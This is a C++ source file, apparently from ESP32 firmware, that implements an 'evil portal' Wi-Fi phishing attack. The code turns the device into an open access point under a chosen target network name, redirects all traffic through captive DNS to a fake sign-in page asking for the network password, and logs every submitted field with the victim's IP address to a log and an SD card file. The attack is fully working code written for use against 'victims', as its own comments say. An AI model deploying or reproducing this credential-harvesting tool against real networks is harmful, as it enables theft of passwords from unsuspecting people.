#include "evil_portal.h"
#include "state.h"
#include "dns_server.h"
#include "sd_card.h"
#include "net_globals.h"
#include "esp_wifi.h"
#include "esp_netif.h"
#include "esp_http_server.h"
#include "cJSON.h"
#include "lwip/sockets.h"
#include "lwip/inet.h"
#include <cstdio>
#include <cstring>

static bool s_active = false;
static std::string s_html;
static httpd_handle_t s_httpd = nullptr;

static const char *DEFAULT_TEMPLATE = R"HTML(
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1">
<title>WiFi Sign-in</title>
<style>body{font-family:sans-serif;max-width:360px;margin:60px auto;padding:0 16px}
h2{text-align:center}input{width:100%;padding:10px;margin:8px 0;box-sizing:border-box}
button{width:100%;padding:10px;background:#1a73e8;color:#fff;border:0;border-radius:4px}</style>
</head><body>
<h2>Wi-Fi Network Sign-in</h2>
<p>Enter your network password to continue.</p>
<form method="POST" action="/portal_submit">
<input name="password" type="password" placeholder="Password" required>
<button type="submit">Connect</button>
</form>
</body></html>
)HTML";

// --- victim-facing HTTP routes ---------------------------------------------

static std::string readBody(httpd_req_t *req) {
  std::string body;
  if (req->content_len == 0) return body;
  body.resize(req->content_len);
  size_t received = 0;
  while (received < body.size()) {
    int r = httpd_req_recv(req, &body[received], body.size() - received);
    if (r <= 0) { body.clear(); return body; }
    received += r;
  }
  return body;
}

static std::string urlDecode(const std::string &in) {
  std::string out;
  out.reserve(in.size());
  for (size_t i = 0; i < in.size(); i++) {
    if (in[i] == '+') {
      out += ' ';
    } else if (in[i] == '%' && i + 2 < in.size()) {
      int hi = in[i + 1], lo = in[i + 2];
      auto hexVal = [](int c) -> int {
        if (c >= '0' && c <= '9') return c - '0';
        if (c >= 'a' && c <= 'f') return c - 'a' + 10;
        if (c >= 'A' && c <= 'F') return c - 'A' + 10;
        return 0;
      };
      out += (char)((hexVal(hi) << 4) | hexVal(lo));
      i += 2;
    } else {
      out += in[i];
    }
  }
  return out;
}

static esp_err_t portalSubmitHandler(httpd_req_t *req) {
  std::string body = readBody(req);
  cJSON *doc = cJSON_CreateObject();
  size_t pos = 0;
  while (pos < body.size()) {
    size_t amp = body.find('&', pos);
    if (amp == std::string::npos) amp = body.size();
    std::string pair = body.substr(pos, amp - pos);
    size_t eq = pair.find('=');
    if (eq != std::string::npos) {
      std::string key = urlDecode(pair.substr(0, eq));
      std::string val = urlDecode(pair.substr(eq + 1));
      cJSON_AddStringToObject(doc, key.c_str(), val.c_str());
    }
    pos = amp + 1;
  }
  char *fieldsJson = cJSON_PrintUnformatted(doc);

  char ipStr[40] = "unknown";
  int sock = httpd_req_to_sockfd(req);
  struct sockaddr_storage addr;
  socklen_t addrLen = sizeof(addr);
  if (sock >= 0 && getpeername(sock, (struct sockaddr *)&addr, &addrLen) == 0) {
    if (addr.ss_family == AF_INET) {
      inet_ntop(AF_INET, &((struct sockaddr_in *)&addr)->sin_addr, ipStr, sizeof(ipStr));
    } else if (addr.ss_family == AF_INET6) {
      inet_ntop(AF_INET6, &((struct sockaddr_in6 *)&addr)->sin6_addr, ipStr, sizeof(ipStr));
    }
  }

  EvilPortal::logCapture(ipStr, fieldsJson ? fieldsJson : "{}");
  if (fieldsJson) cJSON_free(fieldsJson);
  cJSON_Delete(doc);

  httpd_resp_set_type(req, "text/html");
  return httpd_resp_send(req, "<h3>Connected.</h3>", HTTPD_RESP_USE_STRLEN);
}

static esp_err_t catchAllHandler(httpd_req_t *req) {
  httpd_resp_set_type(req, "text/html");
  return httpd_resp_send(req, s_html.c_str(), s_html.size());
}

// --- lifecycle ---------------------------------------------------------

void EvilPortal::start(const std::string &apSsid, const std::string &htmlTemplate) {
  s_html = htmlTemplate.empty() ? std::string(DEFAULT_TEMPLATE) : htmlTemplate;

  WifiApModeAcquire();

  // Reconfigure our own AP to the target SSID (open network).
  wifi_config_t cfg = {};
  esp_wifi_get_config(WIFI_IF_AP, &cfg);
  memset(cfg.ap.ssid, 0, sizeof(cfg.ap.ssid));
  size_t n = apSsid.size() < sizeof(cfg.ap.ssid) ? apSsid.size() : sizeof(cfg.ap.ssid);
  memcpy(cfg.ap.ssid, apSsid.data(), n);
  cfg.ap.ssid_len = (uint8_t)n;
  cfg.ap.authmode = WIFI_AUTH_OPEN;
  memset(cfg.ap.password, 0, sizeof(cfg.ap.password));
  esp_wifi_set_config(WIFI_IF_AP, &cfg);

  esp_netif_ip_info_t ipInfo;
  esp_netif_get_ip_info(g_apNetif, &ipInfo);
  DnsServer::start(ipInfo.ip.addr);

  httpd_config_t httpCfg = HTTPD_DEFAULT_CONFIG();
  httpCfg.max_uri_handlers = 4;
  httpCfg.uri_match_fn = httpd_uri_match_wildcard;
  if (httpd_start(&s_httpd, &httpCfg) == ESP_OK) {
    httpd_uri_t submitUri = {};
    submitUri.uri = "/portal_submit";
    submitUri.method = HTTP_POST;
    submitUri.handler = portalSubmitHandler;
    httpd_register_uri_handler(s_httpd, &submitUri);

    httpd_uri_t catchAllUri = {};
    catchAllUri.uri = "/*";
    catchAllUri.method = HTTP_GET;
    catchAllUri.handler = catchAllHandler;
    httpd_register_uri_handler(s_httpd, &catchAllUri);
  } else {
    appState.log("[portal] failed to start portal web server");
  }

  appState.mode = OpMode::EVIL_PORTAL;
  s_active = true;
  appState.log("[portal] started as SSID \"" + apSsid + "\" -- captive DNS + portal page active");
}

void EvilPortal::stop() {
  if (!s_active) return;
  DnsServer::stop();
  if (s_httpd) {
    httpd_stop(s_httpd);
    s_httpd = nullptr;
  }
  s_active = false;
  appState.mode = OpMode::IDLE;
  WifiApModeRelease();
  appState.log("[portal] stopped");
}

bool EvilPortal::active() { return s_active; }

std::string EvilPortal::portalHtml() { return s_html; }

void EvilPortal::logCapture(const std::string &clientIp, const std::string &fieldsJson) {
  appState.log("[portal] capture from " + clientIp + ": " + fieldsJson);
  if (!appState.sdCardOk) return;
  FILE *f = fopen(SD_MOUNT_POINT "/portal_log.txt", "a");
  if (f) {
    fprintf(f, "{\"t\":%lld,\"ip\":\"%s\",\"fields\":%s}\n",
            (long long)nowMs(), clientIp.c_str(), fieldsJson.c_str());
    fclose(f);
  }
}
